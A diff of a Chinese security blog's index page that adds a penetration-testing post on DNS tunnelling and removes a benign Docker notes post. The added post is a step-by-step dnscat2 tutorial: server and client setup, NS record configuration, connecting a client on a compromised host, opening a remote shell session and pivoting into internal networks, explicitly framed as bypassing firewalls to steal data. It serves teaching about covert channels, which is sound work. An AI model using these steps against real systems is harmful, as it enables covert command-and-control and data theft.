@@ -258,6 +258,224 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/07/利用DNS-Tunnel传输数据/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/08/07/利用DNS-Tunnel传输数据/" itemprop="url">
+                  利用DNS Tunnel传输数据
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-07T10:37:51+08:00">
+                2018-08-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/08/07/利用DNS-Tunnel传输数据/" class="leancloud_visitors" data-flag-title="利用DNS Tunnel传输数据">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当一些服务器被黑客非法入侵之后，黑客都是以从入侵中获益作为目标，而最大的获益方式就是偷取高价值的数据，所以大部分公司也会为了高价值的数据保护设下层层防火墙以及加密，让核心资产偷不走、解不开、用不了。</p>
+<p>其中“偷不走”这步，一般都是对出站的流量做很严格的限制，并且加上很多的报警规则，这样即使入侵进去，也很难建立一个通道将核心资产偷走。</p>
+<p>但是防御这件事情，不能因噎废食，服务器不能因为有潜在的风险就把所有的通道都限制掉，就比如服务器需要允许至少对一个服务器的DNS请求，在这个前提下，就有大牛想出通过DNS Tunnel外发数据，避过防火墙来外发数据。</p>
+<h2 id="0x01-DNS"><a href="#0x01-DNS" class="headerlink" title="0x01 DNS"></a>0x01 DNS</h2><p>DNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p>
+<h2 id="0x02-DNS-Tunnel"><a href="#0x02-DNS-Tunnel" class="headerlink" title="0x02 DNS Tunnel"></a>0x02 DNS Tunnel</h2><p>DNS Tunnel，是隐蔽信道的一种，通过将其他协议封装在DNS协议中传输建立通信。</p>
+<p>DNS Tunnel可以分为直连和中继两种。</p>
+<p>直连也就是用目标服务器直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度快，但是隐蔽性比较弱，很容易被探测到，另外限制比较高，很多场景不允许自己指定DNS Server。</p>
+<p>中继是通过DNS迭代查询而实现的中继隧道，则更为隐秘，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多。</p>
+<p>中继过程中的一个关键点是对DNS缓存机制的规避，因为如果需要解析的域名在Local DNS Server中已经有缓存时，Local DNS Server就不会转发数据包。所以在我们构造的请求中，每次查询的域名都是不一样的或者是已经是过期的。</p>
+<p>对DNS载荷的编码是DNS Tunnel的另一个核心技术。从高层来看，载荷只是客户端和服务器通信的正常流量。例如客户端发送一个A记录请求给服务器，查询的主机名为 2roAUwBaCGRuc3R1bm5lbGluZwo.test.domain.com,其中2roAUwBaCGRuc3R1bm5lbGluZwo则是客户端传递给服务器的信息，这串字符解码后的信息便是dns tunnel。</p>
+<p>大多数场景下，内网的Client位于防火墙后，Server不可能发起连接。所以Client会定时向Server发送请求，保证二者之间的通信状态。</p>
+<h2 id="0x03-使用dnscat2工具实现"><a href="#0x03-使用dnscat2工具实现" class="headerlink" title="0x03 使用dnscat2工具实现"></a>0x03 使用dnscat2工具实现</h2><p>Dnscat2的定位是一个封装在DNS协议中加密的命令与控制(C&amp;C)信道。它同样是C/S架构，Client由c编写，server由ruby编写。Client位于感染主机，而Server位于权威域名服务器上，如果没有权威域名服务器，则可以采用直连模式。</p>
+<p>为了直接达到能拿出来用的效果，我就使用实际场景搭建了，应用于实际场景我们需要一台公网服务器、一个域名、还有dnscat2程序。</p>
+<p>公网服务器作为server端，我建议使用ubuntu或者高版本centos（低版本的centos会出现一些小问题，如果比较熟悉ruby和gem挺容易解决的，我这里使用ubuntu演示，没有太多经验的可以跟着我使用ubuntu来现尝试一下）</p>
+<p>server使用如下代码安装需要的环境，然后使用git下载dnscat2进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ruby ruby-dev git make g++ rubygems</span><br><span class="line">gem update --system</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure></p>
+<p>出现几行绿色字体如下所示就代表安装完成了：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns01.png?raw=true" alt=""></p>
+<p>然后我们需要在域名解析服务器上这样伪造，设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址。如下图的设置，打码部分是服务器ip地址。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns02.png?raw=true" alt=""></p>
+<p>client如果是linux，就使用git下载dnscat2源码，然后编译dnscat2/client文件夹中的c文件</p>
+<p>linux-client端部署代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></p>
+<p>client如果是windows，就直接在这个网址（<a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a> ）下载win32.zip的dnascat2后解压就可以了</p>
+<p>至此，环境都部署完毕，就可以开始连接隧道了。我测试时使用ubuntu系统的公网服务器做server，用本机的kali做client。</p>
+<p>我们首先在server端开启隧道：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb dns.uuzdaisuki.com --no-cache</span><br></pre></td></tr></table></figure></p>
+<p>将这个域名改成自己刚刚设置的ns记录的子域名，–no-cache代表不进行缓存</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns03.png?raw=true" alt=""></p>
+<p>然后将上面产生的这串secret复制下来，要在client中使用。</p>
+<p>client中运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dnscat --dns domain=dns.uuzdaisuki.com --secret=xxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns04.png?raw=true" alt=""></p>
+<p>domain参数是我们ns记录的子域名，secret参数是刚才server中生成的密文，我们传输信息的安全程度就取决于它。windows中参数使用略有不同，自己查看help文件即可。</p>
+<p>client运行得到上面结果之后，server中也会出现一个new window create，后面是它的sessionID，我们现在就可以在server中通过这个session连接控制client了</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns05.png?raw=true" alt=""></p>
+<p>使用如下代码可以进去这个session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session -i 1</span><br></pre></td></tr></table></figure></p>
+<p>然后使用help可以查看可以使用的命令：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns06.png?raw=true" alt=""></p>
+<p>比如我们要使用一个shell控制，可以输入shell获取一个新的window，sessionID为2，然后再session -i 2切入。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns07.png?raw=true" alt=""></p>
+<p>之后就可以使用命令交互：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns08.png?raw=true" alt=""></p>
+<p>此时我们也可以通过dns隧道来访问目标系统可以访问的网络，类似于ssl，在dnscat2中用listen命令实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen [lhost:]lport rhost:rport</span><br></pre></td></tr></table></figure></p>
+<p>比如我们要通过对方网络访问百度，那就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen 1234 www.baidu.com:80</span><br></pre></td></tr></table></figure></p>
+<p>访问localhost:1234就可以通过对方网络访问百度了，不过这个功能一般是用来访问内网才可以访问的网站，探测对方内网之后将baidu替换成对方内网的站就可以了。</p>
+<p>我们dns tunnel建立好之后，主要是为了绕过防火墙偷数据，使用help学习其他功能传输即可。</p>
+<h3 id="抓包观察"><a href="#抓包观察" class="headerlink" title="抓包观察"></a>抓包观察</h3><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns09.png?raw=true" alt=""></p>
+<p>在客户端中抓包可以看到，有很多DNS的TXT、CNAME、MX的查询方法，这是因为Dnscat2 利用的DNS请求类型默认是TXT,CNAME,MX随机混合使用，不过我们可以在运行时通过参数自定义来更改请求方式。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>用于dns tunnel的工具除了dnscat2(灵活)，还有dns2tcp(Kali直接集成了这个工具)、iodine(速度快)等，各有特点，我们可以根据实际情况来选取。</p>
+<p>还有要注意的一点是使用了dns tunnel只是绕过了一些传统防火墙，如果对方的防御系统具备一些基于机器学习或深度学习的检测策略，或者对方的安全人员比较熟悉这种偷数据的方式，还是会被发现的。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/03/C-C控制服务思路浅析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2259,261 +2477,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/05/Docker使用笔记/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/07/05/Docker使用笔记/" itemprop="url">
-                  Docker使用笔记
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-05T14:43:02+08:00">
-                2018-07-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/07/05/Docker使用笔记/" class="leancloud_visitors" data-flag-title="Docker使用笔记">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在一些漏洞环境的复现中，docker相比虚拟机要方便的多，而且更节省内存，启动更快。能节约我们非常多时间。对安全研究人员来说，docker是必须掌握的一样工具。</p>
-<h2 id="0x01-docker"><a href="#0x01-docker" class="headerlink" title="0x01 docker"></a>0x01 docker</h2><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从Apache2.0协议开源。</p>
-<p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p>
-<p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p>
-<h2 id="0x02-docker安装"><a href="#0x02-docker安装" class="headerlink" title="0x02 docker安装"></a>0x02 docker安装</h2><ul>
-<li>Ubuntu中安装：</li>
-</ul>
-<p><a href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">http://www.runoob.com/docker/ubuntu-docker-install.html</a></p>
-<ul>
-<li>Windows中安装：</li>
-</ul>
-<p><a href="http://www.runoob.com/docker/windows-docker-install.html" target="_blank" rel="noopener">http://www.runoob.com/docker/windows-docker-install.html</a></p>
-<p>其中windows10专业版（必须是专业版，其他版本实测可以安装但是无法直接使用linux container模式）可以使用docker for windows、其余的版本安装Docker Toolbox。</p>
-<ul>
-<li>MacOS安装</li>
-</ul>
-<p><a href="http://www.runoob.com/docker/macos-docker-install.html" target="_blank" rel="noopener">http://www.runoob.com/docker/macos-docker-install.html</a></p>
-<h2 id="0x03-更换镜像源"><a href="#0x03-更换镜像源" class="headerlink" title="0x03 更换镜像源"></a>0x03 更换镜像源</h2><p>国内直接访问docker官方镜像源拉取镜像时速度会非常慢，我们需要将docker源切换到阿里镜像源或者网易镜像源。</p>
-<h3 id="源地址获取"><a href="#源地址获取" class="headerlink" title="源地址获取"></a>源地址获取</h3><ul>
-<li>阿里源地址：</li>
-</ul>
-<p>在<a href="https://dev.aliyun.com/search.html登陆自己的阿里云账户，在管理中心-&gt;镜像加速器中会有自己的专属加速地址" target="_blank" rel="noopener">https://dev.aliyun.com/search.html登陆自己的阿里云账户，在管理中心-&gt;镜像加速器中会有自己的专属加速地址</a></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/docker/docker01.png?raw=true" alt=""></p>
-<ul>
-<li>网易源地址：</li>
-</ul>
-<p><a href="http://hub-mirror.c.163.com" target="_blank" rel="noopener">http://hub-mirror.c.163.com</a></p>
-<h3 id="源地址更换"><a href="#源地址更换" class="headerlink" title="源地址更换"></a>源地址更换</h3><ul>
-<li>Ubuntu中更换：</li>
-</ul>
-<p>修改daemon配置文件/etc/docker/daemon.json</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
-<p>如果要用阿里源，上面的仓库地址使用自己的阿里源专属地址即可。</p>
-<ul>
-<li>Docker for Windows中更换：</li>
-</ul>
-<p>在系统右下角托盘图标内右键菜单选择 Settings，打开配置窗口后左侧导航菜单选择 Docker Daemon。编辑窗口内的JSON串，填写加速器地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>Docker for Mac中更换：</li>
-</ul>
-<p>右键点击桌面顶栏的 docker 图标，选择 Preferences ，在 Daemon 标签（Docker 17.03 之前版本为 Advanced 标签）下的 Registry mirrors 列表中将<br><a href="http://hub-mirror.c.163.com" target="_blank" rel="noopener">http://hub-mirror.c.163.com</a> 加到”registry-mirrors”的数组里，点击 Apply &amp; Restart按钮，等待Docker重启并应用配置的镜像加速器。</p>
-<ul>
-<li>Docker Toolbox中更换：</li>
-</ul>
-<p>1.在Windows命令行执行docker-machine ssh [machine-name]进入VM bash</p>
-<p>2.sudo vi /var/lib/boot2docker/profile</p>
-<p>3.在–label provider=virtualbox的下一行添加–registry-mirror <a href="https://xxxxxxxx.mirror.aliyuncs.com" target="_blank" rel="noopener">https://xxxxxxxx.mirror.aliyuncs.com</a></p>
-<p>4.重启docker服务：sudo /etc/init.d/docker restart或者重启VM：exit退出VM bash，在Windows命令行中执行docker-machine restart</p>
-<h2 id="0x04-docker基础命令"><a href="#0x04-docker基础命令" class="headerlink" title="0x04 docker基础命令"></a>0x04 docker基础命令</h2><h3 id="查询、下载、日志"><a href="#查询、下载、日志" class="headerlink" title="查询、下载、日志"></a>查询、下载、日志</h3><ul>
-<li>查看docker信息：docker info</li>
-<li>拉取镜像：docker pull &lt;镜像名&gt;</li>
-<li>在线搜索镜像：docker search &lt;镜像名&gt;</li>
-<li>查询本机所有的镜像：docker images </li>
-<li>查看正在运行容器：docker ps</li>
-<li>查看某容器内运行的进程：docker top <container></container></li>
-<li>查询某个容器的所有操作记录：docker logs {容器ID|容器名称}</li>
-</ul>
-<h3 id="删除容器、镜像"><a href="#删除容器、镜像" class="headerlink" title="删除容器、镜像"></a>删除容器、镜像</h3><ul>
-<li>删除单个容器：docker rm &lt;容器名or ID&gt;</li>
-<li>删除单个镜像：docker rmi <id></id></li>
-</ul>
-<h3 id="启动停止容器"><a href="#启动停止容器" class="headerlink" title="启动停止容器"></a>启动停止容器</h3><ul>
-<li>停止某个容器：docker stop &lt;容器名or ID&gt;</li>
-<li>启动某个容器：docker start &lt;容器名or ID&gt;</li>
-<li>杀掉某个容器：docker kill &lt;容器名or ID&gt;</li>
-</ul>
-<h3 id="docker运行容器"><a href="#docker运行容器" class="headerlink" title="docker运行容器"></a>docker运行容器</h3><p>Usage: docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</p>
-<p>其中image为为容器名、options是配置参数、command是命令</p>
-<p>docker的配置参数非常多，我们常用的一般是用docker开启一个命令交互界面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i ubuntu /bin/bash</span><br></pre></td></tr></table></figure></p>
-<p>其中</p>
-<ul>
-<li><p>-t:在新容器内指定一个伪终端或终端。</p>
-</li>
-<li><p>-i:允许你对容器内的标准输入 (STDIN) 进行交互。</p>
-</li>
-</ul>
-<p>更多的参数可以参考：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">-d, --detach=false         指定容器运行于前台还是后台，默认为false     </span><br><span class="line">-i, --interactive=false   打开STDIN，用于控制台交互    </span><br><span class="line">-t, --tty=false            分配tty设备，该可以支持终端登录，默认为false    </span><br><span class="line">-u, --user=&quot;&quot;              指定容器的用户    </span><br><span class="line">-a, --attach=[]            登录容器（必须是以docker run -d启动的容器）  </span><br><span class="line">-w, --workdir=&quot;&quot;           指定容器的工作目录   </span><br><span class="line">-c, --cpu-shares=0        设置容器CPU权重，在CPU共享场景使用    </span><br><span class="line">-e, --env=[]               指定环境变量，容器中可以使用该环境变量    </span><br><span class="line">-m, --memory=&quot;&quot;            指定容器的内存上限    </span><br><span class="line">-P, --publish-all=false    指定容器暴露的端口    </span><br><span class="line">-p, --publish=[]           指定容器暴露的端口   </span><br><span class="line">-h, --hostname=&quot;&quot;          指定容器的主机名    </span><br><span class="line">-v, --volume=[]            给容器挂载存储卷，挂载到容器的某个目录    </span><br><span class="line">--volumes-from=[]          给容器挂载其他容器上的卷，挂载到容器的某个目录  </span><br><span class="line">--cap-add=[]               添加权限，权限清单详见：http://linux.die.net/man/7/capabilities    </span><br><span class="line">--cap-drop=[]              删除权限，权限清单详见：http://linux.die.net/man/7/capabilities    </span><br><span class="line">--cidfile=&quot;&quot;               运行容器后，在指定文件中写入容器PID值，一种典型的监控系统用法    </span><br><span class="line">--cpuset=&quot;&quot;                设置容器可以使用哪些CPU，此参数可以用来容器独占CPU    </span><br><span class="line">--device=[]                添加主机设备给容器，相当于设备直通    </span><br><span class="line">--dns=[]                   指定容器的dns服务器    </span><br><span class="line">--dns-search=[]            指定容器的dns搜索域名，写入到容器的/etc/resolv.conf文件    </span><br><span class="line">--entrypoint=&quot;&quot;            覆盖image的入口点    </span><br><span class="line">--env-file=[]              指定环境变量文件，文件格式为每行一个环境变量    </span><br><span class="line">--expose=[]                指定容器暴露的端口，即修改镜像的暴露端口    </span><br><span class="line">--link=[]                  指定容器间的关联，使用其他容器的IP、env等信息    </span><br><span class="line">--lxc-conf=[]              指定容器的配置文件，只有在指定--exec-driver=lxc时使用    </span><br><span class="line">--name=&quot;&quot;                  指定容器名字，后续可以通过名字进行容器管理，links特性需要使用名字    </span><br><span class="line">--net=&quot;bridge&quot;             容器网络设置:  </span><br><span class="line">                              bridge 使用docker daemon指定的网桥       </span><br><span class="line">                              host    //容器使用主机的网络    </span><br><span class="line">                              container:NAME_or_ID  &gt;//使用其他容器的网路，共享IP和PORT等网络资源    </span><br><span class="line">                              none 容器使用自己的网络（类似--net=bridge），但是不进行配置   </span><br><span class="line">--privileged=false         指定容器是否为特权容器，特权容器拥有所有的capabilities    </span><br><span class="line">--restart=&quot;no&quot;             指定容器停止后的重启策略:  </span><br><span class="line">                              no：容器退出时不重启    </span><br><span class="line">                              on-failure：容器故障退出（返回值非零）时重启   </span><br><span class="line">                              always：容器退出时总是重启    </span><br><span class="line">--rm=false                 指定容器停止后自动删除容器(不支持以docker run -d启动的容器)    </span><br><span class="line">--sig-proxy=true           设置由代理接受并处理信号，但是SIGCHLD、SIGSTOP和SIGKILL不能被代理</span><br></pre></td></tr></table></figure></p>
-<h3 id="docker提交容器副本"><a href="#docker提交容器副本" class="headerlink" title="docker提交容器副本"></a>docker提交容器副本</h3><p>我们一般对一个容器进行更改之后，想要保留它下次再使用，可以使用commit命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -m=&quot;update&quot; -a=&quot;leticia&quot; &lt;容器id&gt; &lt;新的容器名&gt;</span><br></pre></td></tr></table></figure></p>
-<p>其中</p>
-<ul>
-<li>-m是提交时的更新信息。</li>
-<li>-a是作者名。</li>
-</ul>
-<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>docker的命令还有非常多，但是我们只需要掌握上面的一些命令，就可以在每次需要搭建漏洞环境时，从网络上寻找别人配置好的镜像拉取下来使用，能够节约非常多的时间。而且如果你的设备配置不是很高的话，docker在物理机中运行也远远比运行一个完整的虚拟机要流畅的多。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2563,7 +2526,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">79</span>
+                <span class="site-state-item-count">80</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
